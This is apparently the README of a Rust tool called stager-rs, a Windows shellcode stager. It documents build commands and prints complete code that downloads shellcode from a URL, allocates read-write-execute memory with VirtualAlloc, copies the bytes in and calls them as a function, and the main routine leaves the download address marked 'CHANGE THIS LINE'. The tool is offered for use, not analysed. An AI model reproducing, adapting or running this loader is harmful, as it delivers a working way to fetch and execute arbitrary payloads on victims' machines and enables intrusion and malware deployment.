# stager-rs

This program allocates executable memory, downloads shellcode from a URL, writes the shellcode to that memory, and executes it.

## Build Instructions

__Compiling from Windows__ : `cargo build --release`


This will generate a binary located at:

```
target/release/stager.exe
```

__Compiling from Unix-based Systems__:  `cargo build --target x86_64-pc-windows-gnu --release`

This will generate a binary located at:

```bash
target/x86_64-pc-windows-gnu/release/stager.exe
```

## Detailed Breakdown

### 1. `fetch_payload(url: &String) -> Result<Vec<u8>, Box<dyn Error>>`

This function sends an HTTP GET request to the specified URL and retrieves the response body, which is expected to be the shellcode. It converts the response bytes into a `Vec<u8>` for further processing.

```rust
fn fetch_payload(url: &String) -> Result<Vec<u8>, Box<dyn Error>> {
    let client = Client::new();
    let response = client.get(url).send()?;
    let shellcode = response.bytes()?.to_vec();

    Ok(shellcode)
}
```

- The `reqwest::blocking::Client` is used for synchronous HTTP requests.
- The shellcode is fetched as raw bytes and returned as a vector.

### 2. `allocate_memory(dwsize: usize) -> *mut u8`

This function allocates memory for the shellcode using `VirtualAlloc`. The memory is allocated with `MEM_COMMIT` and `MEM_RESERVE` flags, and the protection is set to `PAGE_EXECUTE_READWRITE`.

```rust
unsafe fn allocate_memory(dwsize: usize) -> *mut u8{
    VirtualAlloc(
        None,
        dwsize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    ) as *mut u8
}
```

- `dwsize` is the size of the memory to allocate, based on the length of the shellcode.
- The `VirtualAlloc` function is called with the appropriate flags to allocate memory that can be executed.

### 3. `execute_payload(shellcode: &[u8], pointer: *mut u8) -> Result<(), Box<dyn Error>>`

In this function, the shellcode is copied into the allocated memory, and the memory is treated as a function pointer for execution.

```rust
unsafe fn execute_payload(shellcode: &[u8], pointer: *mut u8) -> Result<(), Box<dyn Error>> {
    pointer.copy_from_nonoverlapping(shellcode.as_ptr(), shellcode.len());

    let func: extern "stdcall" fn() = std::mem::transmute(pointer);

    func();
    
    Ok(())
}
```

- `copy_from_nonoverlapping` is used to copy the shellcode into the allocated memory.
- The memory is then cast into an executable function pointer using `std::mem::transmute`.
- The shellcode is executed by calling the function pointer.

### 4. `main`

The `main` function coordinates the program:

```rust
fn main() {
    unsafe {

        let url = String::from("http://127.0.0.1:8080/shellcode"); // CHANGE THIS LINE
        let shellcode = fetch_payload(&url).unwrap();
        let dwsize = shellcode.len();
        let pointer = allocate_memory(dwsize);

        execute_payload(&shellcode, pointer);
    }
}
```

- It sets the URL for the shellcode (`http://127.0.0.1:8080/shellcode`) — this URL should point to the location where the shellcode is hosted.
- It then calls the previously defined functions to fetch, allocate memory, and execute the shellcode.

## Example Output

![screenshot](https://github.com/user-attachments/assets/ef470625-4c69-4b66-b1a2-fb9967367b8c)

